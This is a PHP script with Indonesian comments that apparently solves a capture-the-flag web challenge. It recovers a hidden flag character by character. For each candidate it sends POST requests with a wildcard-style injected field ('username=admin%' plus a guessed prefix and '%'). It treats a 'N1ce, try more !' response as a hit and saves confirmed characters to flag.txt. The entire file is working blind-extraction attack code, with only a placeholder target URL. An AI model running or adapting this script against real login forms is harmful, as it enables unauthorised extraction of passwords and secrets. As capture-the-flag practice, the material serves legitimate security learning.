<?php 

		$url = 'linknya';
		
		foreach (range(1, 30) as $i) 
		{
			$status = "";
			if ( $status != true ) 
			{
				$content = "";
				if (file_get_contents("flag.txt") != null) 
				{
					$content = file_get_contents("flag.txt");
				}
					$specialchars 		= array('!','+','{','}',"-"," ",":","/");//etc
					// $specialchars 		= ["-","&","{","}","_",""];//etc
					// $alphabet = array('A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','-','+','{','}');
					foreach (array_merge($specialchars,range('A','Z'), range('a','z'), range('0','9')) as $letter) 
					{//melakukan looping berdasarkan string dan chars 
						$myvars = "username=admin%&dawet=".$content.$letter."%&submit";//kirim request POST
						$ch = curl_init( $url );
						curl_setopt( $ch, CURLOPT_POST, 1);
						curl_setopt( $ch, CURLOPT_POSTFIELDS, $myvars);
						curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
						curl_setopt( $ch, CURLOPT_HEADER, 0);
						curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);
						$response = curl_exec( $ch );

						if (eregi("N1ce, try more !", $response)) // jika response terdapat kata N1ce, try more !
						{
							$status = true; // maka TRUE
						}else{
							$status = false;// maka FALSE
						}

						if ($status == true) {//dan jika TRUE
							echo $letter."<<< BINGOOO ! \n";// tulis BINGOOO
							$current = file_get_contents('flag.txt'); //ambil dulu isi flag.txt saat ini
							$current .= "".$letter;//agar file put contents tidak mereplace dengan kata yg d get terakhir
							file_put_contents('flag.txt', $current);//dan taruh di file flag.txt
							break;
						}

						else{
							echo $letter .':'.'bukan anu itu'."\n";// jika FALSE , cetak bukan anu itu
						} 
					}
					continue;//klo ketemu lanjut hentikan loop array string dan chars kemudian scan dari awal
					$status = "";

			}
		}


?>
